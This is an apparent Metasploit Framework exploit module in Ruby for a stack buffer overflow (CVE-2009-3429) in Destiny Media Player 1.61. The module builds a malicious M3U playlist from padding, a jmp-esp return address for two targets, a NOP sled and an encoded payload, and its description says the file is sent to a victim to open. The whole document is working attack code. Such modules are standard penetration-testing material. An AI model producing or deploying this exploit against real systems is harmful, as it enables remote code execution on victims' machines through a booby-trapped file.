##
# $Id: destinymediaplayer16.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Destiny Media Player 1.61 PLS M3U Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Destiny Media Player 1.61.
					An attacker must send the file to victim and the victim must open the file. File-->Open Playlist
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Trancek <trancek[at]yashira.org>' ],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2009-3429' ],
					[ 'OSVDB', '53249' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/7651' ],
					[ 'BID', '33091' ],
				],
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0a\x0d\x3c\x22\x3e\x3d",
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# Tested ok patrickw 20090503
					[ 'Destiny Universal', { 'Ret' => 0x00bf9d4d } ], #jmp esp Destiny.exe
					[ 'Windows XP SP2 Spanish', { 'Ret' => 0x7c951eed } ], #jmp esp
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 03 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'exploit_destiny.m3u']),
			], self.class)

	end

	def exploit

		filepls = rand_text_alpha_upper(2052)
		filepls << [target.ret].pack('V')
		filepls << make_nops(10)
		filepls << payload.encoded
		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(filepls)

	end

end

